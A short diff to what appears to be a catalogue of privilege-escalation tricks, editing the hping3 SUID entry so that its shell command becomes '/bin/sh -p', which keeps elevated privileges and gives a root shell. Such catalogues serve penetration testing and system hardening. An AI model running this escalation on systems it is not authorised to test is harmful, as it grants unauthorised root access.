@@ -7,7 +7,7 @@
     ],
     "suid": [
       {
-        "code": "./hping3\n/bin/sh\n"
+        "code": "./hping3\n/bin/sh -p\n"
       }
     ],
     "sudo": [
